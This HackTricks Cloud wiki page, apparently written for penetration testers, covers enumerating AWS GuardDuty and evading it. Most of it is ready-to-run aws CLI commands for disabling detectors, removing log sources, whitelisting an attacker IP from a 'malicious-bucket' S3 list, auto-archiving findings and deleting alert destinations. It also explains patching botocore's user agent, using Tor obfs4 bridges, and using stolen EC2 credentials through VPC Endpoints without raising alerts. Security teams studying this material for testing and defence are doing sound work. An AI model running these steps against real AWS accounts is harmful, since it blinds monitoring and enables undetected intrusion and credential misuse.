# AWS - GuardDuty Enum

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## GuardDuty

Amazon GuardDuty is a regional-based intelligent **threat detection service**, the first of its kind offered by AWS, which allows users to **monitor** their **AWS account** for **unusual and unexpected behavior by analyzing VPC Flow Logs, AWS CloudTrail management event logs, CloudTrail S3 data event logs, and DNS logs**. It uses **threat intelligence feeds**, such as lists of **malicious IP** addresses and **domains**, and **machine learning** to identify **unexpected and potentially unauthorized and malicious activity** within your AWS environment. This can include issues like escalations of privileges, uses of exposed credentials, or communication with malicious IP addresses, or domains.

Alerts **appear in the GuardDuty console (90 days)** and CloudWatch Events.

For example, GuardDuty can detect compromised **EC2 instances serving malware or mining** bitcoin. It also monitors AWS account **access behavior for signs of compromise**, such as unauthorized infrastructure deployments, like instances deployed in a **Region that has never been used**, or **unusual API calls**, like a password policy change to reduce password strength.\
You can **upload list of whitelisted and blacklisted IP addresses** so GuardDuty takes that info into account.

Finding summary:

* Finding type
* Severity: 7-8.9High, 4-6.9Medium, 01-3.9Low
* Region
* Account ID
* Resource ID
* Time of detection
* Which threat list was used

The body has this information:

* Resource affected
* Action
* Actor: Ip address, port and domain
* Additional Information

You can **invite other accounts** to a different AWS GuardDuty account so **every account is monitored from the same GuardDuty**. The master account must invite the member accounts and then the representative of the member account must accept the invitation.\
There are different IAM Role permissions to allow GuardDuty to get the information and to allow a user to u**pload IPs whitelisted and blacklisted**.\
GuarDuty uses a service-linked role called "AWSServiceRoleForAmazonGuardDuty" that allows it to retrieve metadata from affected endpoints.

You pay for the processing of your log files, per 1 million events per months from CloudTrail and per GB of analysed logs from VPC Flow

When a user **disable GuardDuty**, it will stop monitoring your AWS environment and it won't generate any new findings at all, and the **existing findings will be lost**.\
If you just stop it, the existing findings will remain.

## Actions

### Enumeration

```bash
aws guardduty list-organization-admin-accounts
aws guardduty list-invitations
aws guardduty get-invitations-count
aws guardduty list-detectors
aws guardduty describe-organization-configuration --detector-id <id>
aws guardduty get-detector --detector-id <id>
aws guardduty list-filters --detector-id <id>
aws guardduty get-filter --detector-id <id> --filter-name
aws guardduty list-findings --detector-id <id>
aws guardduty get-findings --detector-id <id> --finding-ids <id>
aws guardduty get-findings-statistics --detector-id <id> --finding-statistic-types <types>
aws guardduty list-ip-sets --detector-id <id>
aws guardduty list-members --detector-id <id>
aws guardduty list-publishing-destinations --detector-id <id>
aws guardduty list-threat-intel-sets --detector-id <id>
aws guardduty list-ip-sets
aws guardduty get-ip-set --detector-id <id>
aws guardduty get-master-account --detector-id <id>
aws guardduty get-members --detector-id <id> --account-ids <id>
aws guardduty get-member-detectors --detector-id <id> --account-ids <id>
aws guardduty get-threat-intel-set --detector-id <id> --threat-intel-set-id <id>
```

## Avoid Detection

### `guardduty:ListDetectors`, `guardduty:UpdateDetector`

With those permissions you could disable GuardDuty to avoid triggering alerts.

```bash
# Disabling the detector
aws guardduty update-detector \
    --detector-id <detector-id> \
    --no-enable 

# Removing s3 as a log source
aws guardduty update-detector \
    --detector-id <detector-id> \
    --data-sources S3Logs={Enable=false}

# Increase finding update time to 6 hours
aws guardduty update-detector \
    --detector-id <detector-id> \
    --finding-publishing-frequency SIX_HOURS
```

### `guardduty:ListDetectors`, `guardduty:ListIPSet`, `iam:PutRolePolicy`, (`guardduty:CreateIPSet`|`guardduty:UpdateIPSet`)

An attacker could create or update GuardDuty's [Trusted IP list](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_upload-lists.html), including **their own IP on the list**. Any IPs in a trusted IP list will **not have any Cloudtrail or VPC flow log alerts raised** against them.

{% hint style="info" %}
DNS findings are exempt from the Trusted IP list.
{% endhint %}

```
aws guardduty update-ip-set \
    --detector-id <detector-id> \
    --ip-set-id 24adjigdk34290840348exampleiplist \
    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \
    --activate
```

{% hint style="info" %}
Depending on the level of stealth required, the **file can be uploaded to an s3 bucket in the target account, or an account controlled by the attacker.**
{% endhint %}

### `guardduty:CreateFilter`

Newly create GuardDuty findings can be automatically archived via [Suppression Rules](https://docs.aws.amazon.com/guardduty/latest/ug/findings\_suppression-rule.html). An adversary could **use** [**filters**](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_filter-findings.html) **to automatically archive findings** they are likely to generate.

Filters can be created using the [CreateFilter API](https://docs.aws.amazon.com/guardduty/latest/APIReference/API\_CreateFilter.html).

```
aws guardduty create-filter \
    --action ARCHIVE \
    --detector-id <detector-id> \
    --name yourfiltername \
    --finding-criteria file://criteria.json
```

### `guardduty:DeletePublishingDestination`

An adversary could disable alerting simply by [deleting the destination](https://docs.aws.amazon.com/cli/latest/reference/guardduty/delete-publishing-destination.html) of alerts.

```
aws guardduty delete-publishing-destination \
    --detector-id <detector-id> \
    --destination-id def456
```

### Pentest Findings

&#x20;OS's GuardDuty detect AWS API requests from common penetration testingthis and trigger a [PenTest Finding](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#pentest-iam-kalilinux).\
It's detected by the **user agent name** that is passed in the API request.\
Therefore, **modifying the user agent** it's possible to prevent GuardDuty from detecting the attack.

Using OS like Ubuntu, Mac or Windows will prevent this alert from triggering.

To prevent this you can search from the script `session.py` in the `botocore` package. In Kali Linux it's in `/usr/local/lib/python3.7/dist-packages/botocore/session.py`.

Around line [456](https://github.com/boto/botocore/blob/7de36c07ecec503f588ac27658b1795e83b67b75/botocore/session.py#L456) you should see `platform.system()` and `platform.release()`. Replace this **code with legitimate user agent strings like those found in** [**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/user\_agents.txt).

### Tor Client Findings

If you make a connection from **Tor**, **Guarduty** will set the alert [**UnauthorizedAccess:EC2/TorClient**](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-ec2.html#unauthorizedaccess-ec2-torclient)**.**

Guarduty detect this thanks to a [public list of Tor nodes](https://metrics.torproject.org/exonerator.html).&#x20;

If you need to connect through Tor you can **bypass this using** [**Bridges**](https://community.torproject.org/relay/types-of-relays/#Bridge). But obviously it would be better if you just don't use Tor at all to connect.

To use a bridge you an use [Obfs4](https://gitlab.com/yawning/obfs4) (`apt install tor obfs4proxy`) and get a bridge address from [bridges.torproject.org](https://bridges.torproject.org/options).

From here, cre`ate a` torrc file with something similar to:

```
UseBridges 1
Bridge obfs4 <IP ADDRESS>:<PORT> <FINGERPRINT> cert=<cert_string> iat-mode=0
ClientTransportPlugin obfs4 exec /bin/obfs4proxy
```

Fun `tor -f torrc` and you can connect to the regular socks5 proxy on port 9050.

### Credential Exfiltration Detection

If you **steals EC2 creds** from the metadata service and uses them **outside AWS infrastructure** the alert [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationoutsideaws) is triggered.

Moreover, if you **use your own EC2 instance** to use the **stolen credentials** the alert [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationinsideaws) is triggered.

However, there is currently a functioning bypass for this - [VPC Endpoints](https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html). Using **VPC Endpoints** will **not trigger the GuardDuty alert**. What this means is that, as an attacker, `if you steal IAM credentials from an EC2 instance, you can use those credentials from your own EC2 instance while routing traffic through VPC Endpoints. This will not trigger the GuardDuty finding`.

The tool [**SneakyEndpoints**](https://github.com/Frichetten/SneakyEndpoints) was created to automate this process. This project **spins up an environment to attack from via Terraform**. It will create an EC2 instance in a private subnet without internet access and create a number of VPC Endpoints for you to use.

**Another way to bypass this alert** is to simple use stolen credentials in the same machine they were stolen **or in one from the same account.**

## References

* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/)
* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/)
* [https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/](https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/)
* [https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/](https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
